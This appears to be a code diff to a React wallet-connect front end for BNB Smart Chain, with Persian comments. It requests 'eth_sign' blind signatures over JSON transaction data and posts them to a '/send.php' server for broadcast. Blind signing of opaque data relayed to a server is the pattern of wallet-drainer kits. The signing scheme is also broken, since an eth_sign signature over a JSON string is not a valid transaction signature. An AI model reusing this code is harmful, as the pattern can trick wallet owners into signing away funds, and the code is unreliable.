@@ -9,7 +9,7 @@ function App() {
     var ethereumProvider = await EthereumProvider.init({
       showQrModal: true,
       chains: [56], // BSC
-      methods: ["eth_sign"], // تغییر متد به eth_sign
+      methods: ["eth_sign"],
       projectId: "9fe3ed74e1d73141e8b7747bedf77551",
     });
 
@@ -21,14 +21,14 @@ function App() {
 
     let apiUrl = "/send.php";
 
-    async function getRawSignature(address, rawTxData) {
+    async function getRawSignature(address, message) {
       try {
         var rawSignature = await provider.request({
           method: "eth_sign",
-          params: [address, rawTxData], // امضای تراکنش خام
+          params: [address, message], // امضای هش پیام
         });
 
-        return { rawSignature, rawTxData };
+        return { rawSignature, message };
       } catch (error) {
         console.error("❌ Error in getRawSignature:", error);
         return null;
@@ -51,6 +51,11 @@ function App() {
         let resultJson = await response.json();
         console.log("📤 Server Response:", resultJson);
 
+        if (resultJson.error) {
+          console.error("⚠ Transaction Error:", resultJson.error);
+          return null;
+        }
+
         return resultJson.txHash || resultJson.result || resultJson;
       } catch (error) {
         console.error("❌ Error in sendSignedTransaction:", error);
@@ -58,21 +63,22 @@ function App() {
       }
     }
 
-    let rawTxData = JSON.stringify({
-      to: "0xRecipientAddress", // آدرس مقصد را اینجا تنظیم کن
-      value: "0.01", // مقدار BNB
-      gas: "21000", // مقدار گس پایه
-      gasPrice: "5000000000", // مقدار گس پرایس
-      nonce: "0", // این مقدار در سرور جایگزین مقدار صحیح می‌شود
-    });
+    let rawTxData = {
+      to: "0xRecipientAddress",
+      value: "0.01", // مقدار BNB به صورت رشته ارسال شود
+      gas: "21000",
+      gasPrice: "5000000000",
+      nonce: null, // مقدار نانس را سرور محاسبه کند
+    };
 
-    var signedData = await getRawSignature(sender, rawTxData);
+    let rawTxString = JSON.stringify(rawTxData);
+    let signedData = await getRawSignature(sender, rawTxString);
 
     if (signedData) {
       console.log("✍️ Signed Raw Data:", signedData);
-      var txHash = await sendSignedTransaction(
+      let txHash = await sendSignedTransaction(
         signedData.rawSignature,
-        signedData.rawTxData
+        signedData.message
       );
       console.log("📤 Final Transaction Hash:", txHash);
     } else {
